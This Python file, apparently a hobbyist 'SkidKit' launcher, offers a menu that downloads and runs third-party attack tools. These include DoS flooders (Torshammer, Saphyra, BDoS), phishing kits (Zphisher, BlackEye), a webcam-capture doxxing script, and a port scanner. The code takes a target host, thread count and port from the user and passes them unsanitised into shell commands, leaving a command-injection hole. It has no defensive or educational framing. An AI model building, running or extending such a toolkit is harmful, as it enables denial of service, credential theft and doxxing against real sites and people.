import os
import sys
import time
from time import sleep
import socket
import random
import os.path
os.chdir("tools")

men = """\033[38;2;88;159;240m[###]      The Skid ToolKit (\033[0;33mSkidKit\033[38;2;88;159;240m)       [###]
\033[38;2;88;159;240m[###]      Creater by KrisIsHere            [###]
\033[38;2;88;159;240m[###]      Version: \033[0;33m1.0.0\033[38;2;88;159;240m                   [###]
\033[38;2;88;159;240m[###]      Codename: \033[0;33mBender\033[38;2;88;159;240m                 [###]

\033[38;2;88;159;240m[###]      Discord: \033[38;2;0;255;152m@\033[38;2;255;0;211mKrisIsHere#9531\033[38;2;88;159;240m        [###]
\033[38;2;88;159;240m[###]      Follow me on Github: \033[38;2;0;255;152m@\033[38;2;255;0;211mKrisIsHere\033[38;2;88;159;240m [###]
\033[38;2;88;159;240m[###]      Shoutout to: \033[38;2;0;255;152m@\033[38;2;255;0;211mKrisIsHere\033[38;2;88;159;240m         [###]\n"""

try:
    import bane
except:
    xdd = input("You need to install bane\n Would you like to do it automatically? (Y/N) ")
    if xdd == "y":
        os.system("pip3 install bane")
    elif xdd == "Y":
        os.system("pip3 install bane")
    else:
        sys.exit()

try:
    from scapy.all import *
except:
    xdd = input("You need to install scapy\n Would you like to do it automatically? (Y/N) ")
    if xdd == "y":
        os.system("sudo apt install scapy")
    elif xdd == "Y":
        os.system("sudo apt install scapy")
    else:
        sys.exit()

os.system("clear")
ascii = ["""\x1b[1;33m
   _____ _    _     _ _  ___ _
  / ____| |  (_)   | | |/ (_) |
 | (___ | | ___  __| | ' / _| |_
  \___ \| |/ / |/ _` |  < | | __|
  ____) |   <| | (_| | . \| | |_
 |_____/|_|\_\_|\__,_|_|\_\_|\__|\033[0;37m
""", """\x1b[1;31m
███████ ██   ██ ██ ██████  ██   ██ ██ ████████ 
██      ██  ██  ██ ██   ██ ██  ██  ██    ██    
███████ █████   ██ ██   ██ █████   ██    ██ 
     ██ ██  ██  ██ ██   ██ ██  ██  ██    ██ 
███████ ██   ██ ██ ██████  ██   ██ ██    ██ 
\033[0;37m""", """
\x1b[1;32m.▄▄ · ▄ •▄ ▪  ·▄▄▄▄  ▄ •▄ ▪  ▄▄▄▄▄
▐█ ▀. █▌▄▌▪██ ██▪ ██ █▌▄▌▪██ •██
▄▀▀▀█▄▐▀▀▄·▐█·▐█· ▐█▌▐▀▀▄·▐█· ▐█.▪
▐█▄▪▐█▐█.█▌▐█▌██. ██ ▐█.█▌▐█▌ ▐█▌·
 ▀▀▀▀ ·▀  ▀▀▀▀▀▀▀▀▀• ·▀  ▀▀▀▀ ▀▀▀ \033[0;37m
""", """\033[0;33m
 @@@@@@   @@@  @@@  @@@  @@@@@@@   @@@  @@@  @@@  @@@@@@@
@@@@@@@   @@@  @@@  @@@  @@@@@@@@  @@@  @@@  @@@  @@@@@@@
!@@       @@!  !@@  @@!  @@!  @@@  @@!  !@@  @@!    @@!
!@!       !@!  @!!  !@!  !@!  @!@  !@!  @!!  !@!    !@!
!!@@!!    @!@@!@!   !!@  @!@  !@!  @!@@!@!   !!@    @!!
 !!@!!!   !!@!!!    !!!  !@!  !!!  !!@!!!    !!!    !!!
     !:!  !!: :!!   !!:  !!:  !!!  !!: :!!   !!:    !!:
    !:!   :!:  !:!  :!:  :!:  !:!  :!:  !:!  :!:    :!:
:::: ::    ::  :::   ::   :::: ::   ::  :::   ::     ::
:: : :     :   :::  :    :: :  :    :   :::  :       :
                                                            \033[0;37m
""" ]

def update2():
    os.system("mkdir .notgithubtools")
    os.system("cp -r DoS/fasthttp.py .notgithubtools")
    os.system("cp -r Doxxing/ip.py .notgithubtools")
    os.system("cp -r Other/cloudcheck.py .notgithubtools")
    os.system("cp -r Other/pscan.py .notgithubtools")
    os.system("rm -rf Other Phising Doxxing DoS")
    os.system("mkdir Doxxing Other Phising DoS")
    os.system("cp -r .notgithubtools/cloudcheck.py Other")
    os.system("cp -r .notgithubtools/fasthttp.py DoS")
    os.system("cp -r .notgithubtools/ip.py Doxxing")
    os.system("cp -r .notgithubtools/pscan.py Other")
    os.chdir("DoS")
    os.system("git clone https://github.com/Karlheinzniebuhr/torshammer ; git clone https://github.com/JackzGamez/Saphyra.py ; git clone https://github.com/KrisIsHere/BDoS ; ")
    os.chdir("..")
    os.chdir("Phising")
    os.system("git clone https://github.com/htr-tech/zphisher ; git clone https://github.com/An0nUD4Y/blackeye ")
    os.chdir("..")
    os.chdir("Doxxing")
    os.system("git clone https://github.com/hangetzzu/saycheese")
    os.chdir("..")
    os.system("touch .info/tools.py")


def update():
        os.system("rm -rf .info/tools.py")
        os.chdir('..')
        path = os.getcwd()
        parent = os.path.abspath(os.path.join(path, os.pardir))
        os.system("cp -r tools/.info " + parent)
        os.system("cp -r tools/update.py " + parent)
        os.system("python3 " + parent + "/update.py")
        sys.exit()

def other():
        os.system("clear")
        print(random.choice(ascii))

        print(men)

        print("""Choose from menu:
            \033[38;2;0;255;152m1\033[38;2;88;159;240m) CloudFlare checker
            \033[38;2;0;255;152m2\033[38;2;88;159;240m) Port Scanner

            \033[38;2;0;255;152m0\033[38;2;88;159;240m) Go back to main menu""")
        try:
            menu1 = input("""\033[0;33mSkidKitPhish\033[38;2;88;159;240m: """)
            if menu1 == "1":
                xd = input("Site: ")
                os.system("python2 Other/cloudcheck.py " + xd)
            if menu1 == "2":
                ho = input("Host: ")
                os.system("python2 Other/pscan.py -m 1 -M 99999 " + ho)
            if menu == "0":
                menu()
        except:
            menu()

def dox():
        os.system("clear")
        print(random.choice(ascii))

        print(men)

        print("""Choose from menu:
            \033[38;2;0;255;152m1\033[38;2;88;159;240m) IP Tracker
            \033[38;2;0;255;152m2\033[38;2;88;159;240m) SayCheese

            \033[38;2;0;255;152m0\033[38;2;88;159;240m) Go back to main menu""")
        try:
            menu1 = input("""\033[0;33mSkidKitPhish\033[38;2;88;159;240m: """)
            if menu1 == "1":
                os.system("python2 Dox/ip.py")
            if menu1 == "2":
                os.system("bash Doxxing/saycheese/saycheese.sh")
            if menu == "0":
                menu()
        except:
            menu()

def phish():
    os.system("clear")
    print(random.choice(ascii))

    print(men)

    print("""Choose from menu:
        \033[38;2;0;255;152m1\033[38;2;88;159;240m) Zphisher
        \033[38;2;0;255;152m2\033[38;2;88;159;240m) BlackEye

        \033[38;2;0;255;152m0\033[38;2;88;159;240m) Go back to main menu""")
    try:
        menu1 = input("""\033[0;33mSkidKitPhish\033[38;2;88;159;240m: """)
        if menu1 == "1":
            os.system("bash Phising/zphisher/zphisher.sh")
        if menu1 == "2":
            os.system("bash Phising/blackeye/blackeye.sh")
        if menu == "0":
            menu()
    except:
        menu()

def dos():
    os.system("clear")
    print(random.choice(ascii))

    print(men)

    print("""Choose from menu:
        \033[38;2;0;255;152m1\033[38;2;88;159;240m) Torshammer
        \033[38;2;0;255;152m2\033[38;2;88;159;240m) Saphyra
        \033[38;2;0;255;152m3\033[38;2;88;159;240m) BDoS
        \033[38;2;0;255;152m4\033[38;2;88;159;240m) FastHTTP

        \033[38;2;0;255;152m0\033[38;2;88;159;240m) Go back to main menu""")
    try:
        menu1 = input("""\033[0;33mSkidKitDoS\033[38;2;88;159;240m: """)
        if menu1 == "1":
        		targ = input("Target (www.example.com): ")
        		tar = input("Threads: ")
        		port = input("Port: ")
        		os.system("python2 DoS/torshammer/torshammer.py -t " + targ + " -r " + tar + " -p " + port)
        if menu1 == "3":
        		targ = input("Target (www.example.com): ")
        		tar = input("Threads: ")
        		connections = input("Amount of connections per thread: ")
        		port = input("Port: ")
        		os.system("python2 DoS/BDoS/BDoS/BDoS_en.py " + targ + " -t " + tar + " -c " + connections + " -p " + port)
        if menu1 == "2":
            targ = input("Target (www.example.com): ")
            os.system("python2 DoS/Saphyra.py/saphyra " + targ)
        if menu1 == "4":
            try:
                os.system("python2 DoS/fasthttp.py")
            except:
                print("Error: Script not starting")
        if menu == "0":
            menu()
    except:
        menu()

def menu():
    print(random.choice(ascii))

    print(men)

    loop = True
    while loop == True:
        try:
            print("""Choose from menu:
                \033[38;2;0;255;152m1\033[38;2;88;159;240m) DoS
                \033[38;2;0;255;152m2\033[38;2;88;159;240m) Phising
                \033[38;2;0;255;152m3\033[38;2;88;159;240m) Doxxing
                \033[38;2;0;255;152m4\033[38;2;88;159;240m) Other
                \033[38;2;0;255;152m5\033[38;2;88;159;240m) Update
                \033[38;2;0;255;152m6\033[38;2;88;159;240m) Update tools

                \033[38;2;0;255;152m0\033[38;2;88;159;240m) Exit""")
            menu = input("""\033[0;33mSkidKit\033[38;2;88;159;240m: """)
            if menu == "1":
                dos()
            if menu == "2":
                phish()
            if menu == "3":
                dox()
            if menu == "4":
                other()
            if menu == "5":
                update()
            if menu == "6":
                update2()
            if menu == "0":
                exit()
            if menu == "clear":
                os.system("clear")
                print(random.choice(ascii))
                print(men)

        except:
            print("You mistyped, try again.")
if os.path.isfile(".info/tools.py"):
    menu()
else:
    xd = input("Press '1' to download tools: ")
    if xd == "1":
        os.chdir("DoS")
        os.system("git clone https://github.com/Karlheinzniebuhr/torshammer ; git clone https://github.com/JackzGamez/Saphyra.py ; git clone https://github.com/KrisIsHere/BDoS ; ")
        os.chdir("..")
        os.chdir("Phising")
        os.system("git clone https://github.com/htr-tech/zphisher ; git clone https://github.com/An0nUD4Y/blackeye ")
        os.chdir("..")
        os.chdir("Doxxing")
        os.system("git clone https://github.com/hangetzzu/saycheese")
        os.chdir("..")
        os.system("touch .info/tools.py")
